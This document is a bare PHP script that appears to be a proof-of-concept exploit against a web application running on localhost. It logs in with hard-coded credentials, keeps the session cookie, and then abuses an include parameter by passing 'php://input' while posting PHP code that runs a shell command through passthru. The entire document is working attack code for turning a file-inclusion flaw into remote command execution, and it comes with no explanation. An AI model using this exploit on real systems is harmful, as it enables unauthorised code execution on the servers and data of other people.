#!/usr/bin/php
<?php
$url = "http://localhost/index.php?action=login.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookies");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"login=piti&password=supersecret&submit=submit");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);

$page = curl_exec($ch);
curl_close($ch);
unset($ch);

$ch = curl_init();
$url = "http://localhost/index.php?action=php://input";
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_COOKIEFILE, "/tmp/cookies");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"<?php passthru('ls -lha');");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
curl_setopt($ch, CURLOPT_PRIVATE, true);
$page = curl_exec($ch);
echo curl_getinfo($ch, CURLINFO_HEADER_OUT);
curl_close($ch);

echo preg_replace('/<html>[\S\s]*/','',$page);

echo "\n";
